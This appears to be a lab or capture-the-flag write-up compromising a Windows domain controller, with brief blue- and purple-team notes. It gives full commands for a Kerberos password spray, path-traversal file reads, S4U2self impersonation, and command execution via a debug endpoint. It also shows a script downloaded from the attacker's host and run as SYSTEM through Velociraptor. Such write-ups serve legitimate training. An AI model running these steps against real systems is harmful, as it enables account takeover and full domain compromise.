Target : 10.129.242.166

Date : 14/10/2026

```bash
> echo "10.129.242.166 LUS2DC.Lustrous2.vl Lustrous2.vl Lustrous2.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
10.129.242.166 LUS2DC.Lustrous2.vl Lustrous2.vl Lustrous2.htb
```

`nmap` in this shell is `sudo nmap`, and that hangs on the FIDO key, so the scan is `/usr/bin/nmap`. Our source is `tun0` `10.10.15.181`.

```bash
> /usr/bin/nmap -Pn -sC -sV -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 --version-light 10.129.242.166
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 00:04 +0200
Nmap scan report for LUS2DC.Lustrous2.vl (10.129.242.166)
Host is up (0.059s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-06-24  05:20AM       <DIR>          Development
| 04-14-25  04:44AM       <DIR>          Homes
| 08-31-24  01:57AM       <DIR>          HR
| 08-31-24  01:57AM       <DIR>          IT
| 04-14-25  04:44AM       <DIR>          ITSEC
| 08-31-24  01:58AM       <DIR>          Production
|_08-31-24  01:58AM       <DIR>          SEC
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open     domain        Simple DNS Plus
80/tcp   open     http          Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Negotiate
|_http-title: Site doesn't have a title.
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-14 22:05:07Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl)
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl)
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl)
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Not valid before: 2026-10-13T21:38:25
|_Not valid after:  2027-04-14T21:38:25
5985/tcp filtered wsman
9389/tcp open     adws?
Service Info: Host: LUS2DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 4s, deviation: 0s, median: 4s
Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds
```

We've got a domain controller for `Lustrous2.vl`. Anonymous `FTP` is open, IIS on `80` wants `Negotiate`, and `5985` is filtered, so WinRM is not the first door. The clock is about four seconds ahead. We list `Homes`.

```bash
> python3 - << 'PY'
from ftplib import FTP
ftp = FTP()
ftp.connect('10.129.242.166', 21, timeout=15)
ftp.login('anonymous', 'anonymous@')
ftp.cwd('Homes')
names = []
ftp.retrlines('NLST', names.append)
print('\n'.join(names))
print('COUNT', len(names))
ftp.quit()
PY
```

We've got 71 directories. `Thomas.Myers`, `ShareSvc`, and `Sharon.Birch` are in the list. Inbound `NTLM` is off on this box, so the spray is Kerberos, and it is one name and one password.

```bash
> printf 'Thomas.Myers\n' > /tmp/lustrous_one.txt
> kerbrute passwordspray --dc 10.129.242.166 -d lustrous2.vl /tmp/lustrous_one.txt '[REDACTED]'
```

We've got `VALID LOGIN: Thomas.Myers@lustrous2.vl:[REDACTED]`. We write a `krb5.conf` that forces `TCP` and the realm we will ask for, then we take two TGTs. `ShareSvc` with `[REDACTED]` also returns a ticket, so we never bind `445`.

```bash
> cat > /tmp/lustrous2/krb5.conf << 'EOF'
[libdefaults]
    default_realm = LUSTROUS2.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    udp_preference_limit = 1
    rdns = false
    dns_canonicalize_hostname = false
[realms]
    LUSTROUS2.VL = {
        kdc = lus2dc.lustrous2.vl
        admin_server = lus2dc.lustrous2.vl
    }
EOF
> export KRB5_CONFIG=/tmp/lustrous2/krb5.conf
> echo '[REDACTED]' | kinit -c /tmp/lustrous2/thomas.ccache thomas.myers@LUSTROUS2.VL
> echo '[REDACTED]' | kinit -c /tmp/lustrous2/share.ccache ShareSvc@LUSTROUS2.VL
```

We've got `krbtgt/LUSTROUS2.VL` for both. Thomas can read the site.

```bash
> export KRB5CCNAME=/tmp/lustrous2/thomas.ccache
> curl -sS --negotiate -u : --path-as-is 'http://lus2dc.lustrous2.vl/File/Download?fileName=..\..\..\..\windows\win.ini'
```

We've got `win.ini`. The same read on `../../web.config` names `LuShare.dll`.

```text
<aspNetCore processPath="dotnet" arguments=".\LuShare.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
```

```bash
> curl -sS --negotiate -u : --path-as-is 'http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll' -o /tmp/lustrous2/LuShare.dll
```

We've got a .NET assembly. The view `Debug` asks for a PIN, and the UTF-16 string in the DLL is `[REDACTED]`. The role on that action is `ShareAdmins`. `SHARON.BIRCH` is marked sensitive and cannot be delegated. We'll still request S4U2self.

`MITRE ID : Credential Access + Steal or Forge Kerberos Tickets T1558`

```bash
> export KRB5CCNAME=/tmp/lustrous2/share.ccache
> getST.py -k -no-pass -dc-ip 10.129.242.166 -self -impersonate 'SHARON.BIRCH' -altservice 'HTTP/lus2dc.lustrous2.vl' 'LUSTROUS2.VL/ShareSvc'
> export KRB5CCNAME='/tmp/lustrous2/SHARON.BIRCH@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache'
> klist
```

We've got `HTTP/lus2dc.lustrous2.vl@LUSTROUS2.VL` for `SHARON.BIRCH@LUSTROUS2.VL`. The first ticket was saved with a lowercase realm. `klist` showed it, and `curl` still said `Matching credential not found`, because MIT looks the principal up in the same case as `default_realm`.

```bash
> curl -sS --negotiate -u : -X POST 'http://lus2dc.lustrous2.vl/File/Debug' --data 'pin=[REDACTED]' --data-urlencode 'command=gci C:\ -Name -Filter *.txt'
```

We've got `user_2e9c1.txt`. The user flag is on `C:\`, not on a desktop. A command longer than 100 characters is rejected, and `&` in a form body splits the field, so the command is URL-encoded.

```bash
> curl -sS --negotiate -u : -X POST 'http://lus2dc.lustrous2.vl/File/Debug' --data 'pin=[REDACTED]' --data-urlencode 'command=gc C:\user_2e9c1.txt'
```

We've got `[REDACTED]`.

`C:\Program Files\VelociraptorServer` holds `velociraptor-v0.72.4-windows-amd64.exe` and `server.config.yaml`. The runspace is constrained, and a downloaded `.ps1` dies on `ExecutionPolicy`, so we host the script on `tun0` and start it with `powershell -ep Bypass -File`. One backslash in the VQL string turns `\r` in `root.txt` into a carriage return. We double them.

```bash
> cat > /tmp/lustrous2/v.ps1 << 'EOF'
$v='C:\Program Files\VelociraptorServer\velociraptor-v0.72.4-windows-amd64.exe'
& $v --api_config C:\windows\tasks\api.config.yaml query "SELECT * FROM execve(argv=['cmd','/c','whoami & type C:\\Users\\Administrator\\Desktop\\root.txt'])"
EOF
> python3 -m http.server 8081 --bind 10.10.15.181 --directory /tmp/lustrous2
```

The API client is created first, with the same binary, `--config` pointed at `server.config.yaml`, `--name admin`, and `--role administrator`, writing `C:\windows\tasks\api.config.yaml`. The datastore ACL open is denied, and the yaml is still written.

**Blue Team :**
We would hunt `Negotiate` on `80` for `SHARON.BIRCH`, then `POST /File/Debug`. That request reads `C:\user_2e9c1.txt` in the `ShareSvc` process. The same endpoint writes `C:\windows\tasks\api.config.yaml` from `C:\Program Files\VelociraptorServer\server.config.yaml`, and the next query is `execve` as `NT AUTHORITY\SYSTEM`, which is what reads `C:\Users\Administrator\Desktop\root.txt`. `5985` was filtered, so the WinRM logon never happens.

**Purple Team :**
We skipped the UNC hash. `ShareSvc` already took a TGT, and "sensitive and cannot be delegated" does not stop S4U2self, so nothing had to authenticate to us on `445`. The PIN is in `LuShare.dll`. We stayed under the 100 character cap by hosting `v.ps1` on `10.10.15.181:8081`, and we doubled the backslashes so the query would keep the path.

```bash
> curl -sS --negotiate -u : -X POST 'http://lus2dc.lustrous2.vl/File/Debug' --data 'pin=[REDACTED]' --data-urlencode 'command=iwr http://10.10.15.181:8081/v.ps1 -OutFile C:\windows\tasks\v.ps1'
> curl -sS --negotiate -u : -X POST 'http://lus2dc.lustrous2.vl/File/Debug' --data 'pin=[REDACTED]' --data-urlencode 'command=powershell -ep Bypass -File C:\windows\tasks\v.ps1'
```

We've got `nt authority\system` and `[REDACTED]`.
